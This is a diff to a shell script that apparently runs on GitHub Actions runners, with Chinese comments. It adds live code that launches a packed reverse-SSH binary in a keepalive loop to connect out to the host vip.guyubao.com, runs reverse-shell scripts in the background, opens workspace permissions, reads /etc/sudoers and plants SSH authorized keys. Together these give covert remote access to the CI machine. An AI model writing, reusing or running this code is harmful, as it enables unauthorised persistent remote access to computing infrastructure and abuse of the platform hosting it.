@@ -26,7 +26,6 @@ s2="grep -q sftp-server /proc/\$\$/cmdline&&(
 
 
 
-export HOME=/tmp;
 sudo chmod 0777 $GITHUB_WORKSPACE/*;
 #sudo 不重置环境变量
 sudo bash -c ' mkdir /tmp/{A,aB};
@@ -63,6 +62,7 @@ grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9a.txt
 
     grep -q AABBCC_rev_shell /tmp/js9 &&
     (
+    export HOME=/tmp;
     . /home/runner/work/nc_test/nc_test/AABBCC_rev_shell.sh;
     )
 
@@ -142,12 +142,26 @@ sudo unzip -P ${pd127}  /home/runner/work/nc_test/nc_test/free-us1-udp7z.zip  -d
 fi
 
 
-#基本不用了 upx-ssh反弹至xiaomiQ
+# upx-ssh反弹至xiaomiQ
 grep -q AABBCC_10000MDL /tmp/js9 &&
 (  
     echo 123rt5;      
-#. /home/runner/work/nc_test/nc_test/upx-ssh2xiaomiQ.sh
+    bash /home/runner/work/nc_test/nc_test/upx-ssh2xiaomiQ.sh &
 ) 
+
+(while true; do
+        [ ! -f /tmp/keepalive ] && break        
+         num61z2=$(date +%S);
+         num67z2=$(echo "1"$num61z2);
+         num762=$((${num67z2}%8));
+         bport2=5005"$num762";
+         [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&sudo sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport2 -p 52310 vip.guyubao.com";
+         echo "exit_revSSH2_isOK2_$bport2";
+         echo "will sleep 13s for while true";
+         date;
+         sleep 13; 
+)&
+
 
 #如下代码在本机依靠sshd产生socks5-61080代理，就不依赖别的软件了
 mkdir ~/.ssh;
@@ -155,9 +169,11 @@ cd ~/.ssh;
 
 (
     (
-        echo -e "ssh-keygen -t rsa\n";sleep 0.8;echo -e "\n\nls -al;cp id_rsa.pub authorized_keys4;\n";sleep 0.6;echo -e "\n\nexit\nexit\n";
+        echo -e "ssh-keygen -t rsa\n";sleep 0.8;echo -e "\n\nls -al;cp id_rsa.pub authorized_keys4;\nid;";sleep 0.6;echo -e "\n\nexit\nexit\n";
     )|script /tmp/nul2
 ) 2>&1 >/tmp/nu2 &
+
+ls -al . /home/runner/.ssh/;
 
 if [[ -f /home/runner/.ssh/id_rsa.pub &&  -s /home/runner/.ssh/id_rsa.pub ]];then
  cp id_rsa.pub authorized_keys;
